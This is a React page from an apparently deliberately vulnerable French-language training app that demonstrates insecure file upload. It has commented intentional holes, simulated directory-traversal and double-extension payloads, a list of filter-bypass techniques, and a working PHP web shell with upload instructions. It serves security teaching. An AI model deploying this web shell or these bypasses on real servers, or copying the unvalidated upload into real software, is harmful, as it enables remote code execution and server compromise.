
import { useState } from 'react';
import { Link } from 'react-router-dom';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { ArrowLeft, AlertTriangle, Upload as UploadIcon, FileX, CheckCircle } from 'lucide-react';
import { toast } from "sonner";

const Upload = () => {
  const [uploadedFiles, setUploadedFiles] = useState<Array<{name: string, size: number, type: string, dangerous: boolean}>>([]);
  const [uploadResult, setUploadResult] = useState('');

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = Array.from(e.target.files || []);
    
    files.forEach(file => {
      // VULNÉRABILITÉ 1: UPLOAD DE FICHIER NON SÉCURISÉ
      // Aucune validation du type, taille, ou contenu du fichier
      console.log('UNSAFE FILE UPLOAD ATTEMPT:', {
        name: file.name,
        size: file.size,
        type: file.type,
        lastModified: file.lastModified
      });

      // Vérification des extensions dangereuses (pour démonstration)
      const dangerousExtensions = ['.php', '.jsp', '.asp', '.aspx', '.py', '.rb', '.sh', '.bat', '.exe', '.scr'];
      const isDangerous = dangerousExtensions.some(ext => 
        file.name.toLowerCase().endsWith(ext)
      );

      // VULNÉRABILITÉ 2: PAS DE VALIDATION DE TYPE MIME
      // Le type MIME peut être facilement falsifié
      const fileInfo = {
        name: file.name,
        size: file.size,
        type: file.type,
        dangerous: isDangerous
      };

      setUploadedFiles(prev => [...prev, fileInfo]);

      // VULNÉRABILITÉ 3: STOCKAGE DANS UN RÉPERTOIRE ACCESSIBLE VIA WEB
      // En production, les fichiers seraient stockés dans /uploads/ accessible publiquement
      
      if (isDangerous) {
        setUploadResult(`⚠️ FICHIER DANGEREUX UPLOADÉ: ${file.name} - Peut être exécuté sur le serveur!`);
        toast.error(`Fichier dangereux accepté: ${file.name}`);
      } else {
        setUploadResult(`✅ Fichier uploadé: ${file.name}`);
        toast.success(`Fichier uploadé: ${file.name}`);
      }

      // VULNÉRABILITÉ 4: PAS DE LIMITE DE TAILLE
      if (file.size > 10 * 1024 * 1024) { // 10MB
        console.log('LARGE FILE UPLOADED - Could cause DOS:', file.size);
      }
    });
  };

  const simulateDirectoryTraversal = () => {
    // VULNÉRABILITÉ 5: DIRECTORY TRAVERSAL
    // Simulation d'un upload avec chemin malveillant
    const maliciousPath = '../../../etc/passwd';
    console.log('DIRECTORY TRAVERSAL ATTEMPT:', maliciousPath);
    
    setUploadResult(`🚨 DIRECTORY TRAVERSAL: Tentative d'écriture dans ${maliciousPath}`);
    toast.error("Directory Traversal détecté mais non bloqué!");
  };

  const simulateDoubleExtension = () => {
    // VULNÉRABILITÉ 6: DOUBLE EXTENSION
    const maliciousFile = 'image.jpg.php';
    console.log('DOUBLE EXTENSION BYPASS:', maliciousFile);
    
    setUploadResult(`🔓 BYPASS DÉTECTÉ: ${maliciousFile} - Extension masquée!`);
    toast.error("Double extension bypass possible!");
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-green-50 to-blue-50 p-4">
      <div className="container mx-auto max-w-4xl space-y-6">
        <div className="flex items-center justify-between">
          <Link to="/" className="inline-flex items-center gap-2 text-green-600 hover:text-green-800">
            <ArrowLeft className="h-4 w-4" />
            Retour à l'accueil
          </Link>
        </div>

        <Card className="border-red-200">
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <UploadIcon className="h-5 w-5" />
              <AlertTriangle className="h-4 w-4 text-red-600" />
              Upload Non Sécurisé
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-6">
            <Alert className="border-red-200">
              <AlertTriangle className="h-4 w-4" />
              <AlertDescription className="text-red-700">
                <strong>DANGER:</strong> Cette fonction d'upload ne valide ni le type, ni la taille, ni le contenu des fichiers!
              </AlertDescription>
            </Alert>

            <div>
              <Label htmlFor="file-upload" className="text-lg font-semibold">
                Sélectionner des fichiers (aucune restriction)
              </Label>
              <Input
                id="file-upload"
                type="file"
                multiple
                onChange={handleFileUpload}
                className="mt-2 cursor-pointer"
                accept="*/*"
              />
              <p className="text-sm text-gray-600 mt-2">
                Tous types de fichiers acceptés, y compris .php, .exe, .sh, etc.
              </p>
            </div>

            <div className="flex gap-4">
              <Button 
                onClick={simulateDirectoryTraversal}
                className="bg-orange-600 hover:bg-orange-700"
              >
                Test Directory Traversal
              </Button>
              <Button 
                onClick={simulateDoubleExtension}
                className="bg-purple-600 hover:bg-purple-700"
              >
                Test Double Extension
              </Button>
            </div>

            {uploadResult && (
              <Alert className={uploadResult.includes('⚠️') || uploadResult.includes('🚨') ? 'border-red-200' : 'border-green-200'}>
                <AlertDescription className={uploadResult.includes('⚠️') || uploadResult.includes('🚨') ? 'text-red-700' : 'text-green-700'}>
                  {uploadResult}
                </AlertDescription>
              </Alert>
            )}
          </CardContent>
        </Card>

        {/* Liste des fichiers uploadés */}
        {uploadedFiles.length > 0 && (
          <Card>
            <CardHeader>
              <CardTitle>Fichiers Uploadés</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-3">
                {uploadedFiles.map((file, index) => (
                  <div key={index} className={`flex items-center justify-between p-3 rounded border ${file.dangerous ? 'border-red-200 bg-red-50' : 'border-green-200 bg-green-50'}`}>
                    <div className="flex items-center gap-3">
                      {file.dangerous ? 
                        <FileX className="h-5 w-5 text-red-600" /> : 
                        <CheckCircle className="h-5 w-5 text-green-600" />
                      }
                      <div>
                        <p className="font-medium">{file.name}</p>
                        <p className="text-sm text-gray-600">
                          {(file.size / 1024).toFixed(2)} KB • {file.type || 'Type inconnu'}
                        </p>
                      </div>
                    </div>
                    {file.dangerous && (
                      <span className="px-3 py-1 bg-red-100 text-red-700 text-xs rounded-full">
                        DANGEREUX
                      </span>
                    )}
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        )}

        {/* Guide d'exploitation */}
        <Card className="border-red-300">
          <CardHeader>
            <CardTitle className="text-red-700">Guide d'exploitation - Upload</CardTitle>
          </CardHeader>
          <CardContent className="text-sm space-y-4">
            <div>
              <strong className="text-red-600">Vulnérabilités présentes:</strong>
              <ul className="ml-4 mt-2 space-y-1">
                <li>• <strong>Aucune validation de type:</strong> .php, .jsp, .asp acceptés</li>
                <li>• <strong>Pas de limite de taille:</strong> Possibilité de DoS</li>
                <li>• <strong>Stockage non sécurisé:</strong> Fichiers accessibles via web</li>
                <li>• <strong>Directory Traversal:</strong> ../../../etc/passwd</li>
                <li>• <strong>Double extension:</strong> image.jpg.php</li>
                <li>• <strong>Type MIME non vérifié:</strong> Facilement falsifiable</li>
              </ul>
            </div>

            <div>
              <strong className="text-orange-600">Techniques d'exploitation:</strong>
              <ul className="ml-4 mt-2 space-y-1">
                <li>• <strong>Web Shell:</strong> Uploader un fichier .php avec du code malveillant</li>
                <li>• <strong>Bypass filtres:</strong> .php.jpg, .pHp, .php5, etc.</li>
                <li>• <strong>Polyglot files:</strong> Fichiers valides dans plusieurs formats</li>
                <li>• <strong>Null byte injection:</strong> shell.php%00.jpg</li>
                <li>• <strong>Content-Type spoofing:</strong> Modifier l'en-tête HTTP</li>
              </ul>
            </div>

            <div className="bg-yellow-100 p-3 rounded">
              <strong>Exemple de Web Shell PHP:</strong>
              <pre className="mt-2 text-xs bg-gray-800 text-green-400 p-2 rounded">
{`<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>`}
              </pre>
              <p className="mt-2 text-xs">Sauvegarder comme shell.php et uploader</p>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default Upload;
